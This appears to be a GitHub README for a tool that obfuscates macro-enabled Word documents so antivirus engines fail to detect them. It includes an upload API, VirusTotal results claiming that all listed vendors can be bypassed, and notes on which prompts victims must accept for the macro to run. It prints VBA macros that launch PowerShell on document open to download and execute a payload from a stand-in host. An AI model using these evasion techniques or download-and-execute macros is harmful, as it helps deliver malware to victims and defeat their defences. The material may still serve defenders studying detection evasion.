# docm_obfuscator
https://arielkoren.com/blog/2020/12/24/forging-malicious-doc/


Obfuscate a macro-containing Word doc (optionally within a .zip file) using "File Buffer Collapsing", "Ghost File", or "Invalid Header" techniques (or a combination)

## Usage

### Run Script Directly

```
usage: obfuscate_file.py <in_file> <obfuscation_technique>
       obfuscate_file.py unmodified.zip buffer_collapse
       
in_file                The file to obfuscate. Can be a macro-embedded Word doc (.docm), or a .zip file
                       containing one or more .docm

obfuscation_technique  Obfuscation technique to use

                       buffer_collapse      "File Buffer Collapse" - Macro's Local File Header embedded
                                             in compressed data section of another Local File Header
                       ghost_file           "Ghost File" - Local File Header for macro included without
                                             corresponding Central Directory File Header
                       invalid_header       "Invalid File Header" - Local File Header for macro is 
                                             corrupted with invalid CRC-32
                       invalid_plus_buffer  "Invalid File Header" + "File Buffer Collapse"
                       invalid_plus_ghost   "Invalid File Header" + "Ghost File"
    
```

### API Server
Starts an API server for uploading files for obfuscation, and downloading files previously uploaded for obfuscation.

An upload form is hosted at /

Alternately, POST and GET requests can be made as shown below to directly obfuscate/retrieve files.

```
usage: server.py [-h] [-l LHOST] [-p PORT]

optional arguments:
  -h, --help            show this help message and exit
  -l LHOST, --lhost LHOST
                        The bind address to listen on
  -p PORT, --port PORT  The port to listen on

```

#### POST - Send doc/zip for obfuscation

Request:

cname - custom filename to save the obfuscated output with

obfuscation - obfuscation technique to apply (same options as directly running obfuscate_file.py)

file - raw bytes of file to upload

```
POST / HTTP/1.1
Host: localhost.:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4907851351774763772443316270
Content-Length: 16409
Origin: http://localhost.:8000
Connection: close
Referer: http://localhost.:8000/
Upgrade-Insecure-Requests: 1

-----------------------------4907851351774763772443316270
Content-Disposition: form-data; name="cname"

obfuscated_doc.docm
-----------------------------4907851351774763772443316270
Content-Disposition: form-data; name="obfuscation"

invalid_plus_buffer
-----------------------------4907851351774763772443316270
Content-Disposition: form-data; name="file"; filename="bad_doc.docm"
Content-Type: application/vnd.ms-word.document.macroEnabled.12

PK... zip file content...
...
-----------------------------4907851351774763772443316270--
```

Response:
```
HTTP/1.0 200 File obfuscated_doc.docm uploaded successfully with invalid_plus_buffer obfuscation applied
Server: BaseHTTP/0.6 Python/3.7.3
Date: Sat, 02 Jan 2021 18:06:05 GMT
```

#### GET - Retrieve Obfuscated doc/zip

```
GET /obfuscated_doc.docm HTTP/1.1
Host: localhost.:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

## Detections

### Virustotal

#### Malicious .docm

The file "unmodified.docm" (in the artifacts folder on this repo) contains the following macro.
A message box is popped, then Powershell is spawned and a download from `'http://example.com/malicious/payload.exe'` is attempted


```
Private Sub Document_Open()
  MsgBox "Macro popping Powershell!", vbOKOnly, "game over"
  a = Shell("powershell.exe -noexit -Command ""IEX ((new-object net.webclient).downloadstring('http://example.com/malicious/payload.exe'))""", 1)
End Sub
```

Without any obfuscation applied, the doc is extensively detected as malicious:

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/unmodified.png?raw=true)

With some of the obfuscation techniques:

"Ghost File"

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/ghost_file.png?raw=true)

"Invalid File Header + File Buffer Collapsing"

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/invalid_plus_buffer.png?raw=true)


#### Zip containing malicious .docm

The file "unmodified.zip" (in the artifacts folder on this repo) contains the file "unmodified.docm" referenced above, along with 2 other files.
No compression/store has been used.

Unmodified

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/unmodified_zip.png?raw=true)

"Invalid File Header + Ghost File"

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/invalid_plus_ghost_zip.png?raw=true)

"Invalid File Header + File Buffer Collapsing"

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/invalid_plus_buffer_zip.png?raw=true)


## Further Notes

Sangfor Engine Zero was the only antivirus to detect files obfuscated with File Buffer Collapsing combined with another technique.
However, Sangfor was not among the 8 vendors that detected the "Ghost File" technique; thus all the provided vendors can be bypassed with one or a combination of the included techniques.

As referenced in the blog post, these techniques will result in 2 error messages upon opening the obfuscated file. Both messages must be accepted
("Yes" and "Open") for the macro to trigger.

Error 1

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/error1.png?raw=true)

Error 2

![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/error2.png?raw=true)

Interestingly, if a slightly different and equally functional Powershell command is used within the VBA macro, only Error 1 is triggered.
```
Private Sub Document_Open()
  MsgBox "Macro popping Powershell!", vbOKOnly, "game over"
  a = Shell("powershell.exe -noexit -Command ""IWR 'http://example.com/malicious/payload.exe'""", 1)
End Sub
```

This command also appeared to result in a slightly lower initial detection numbers on VirusTotal.
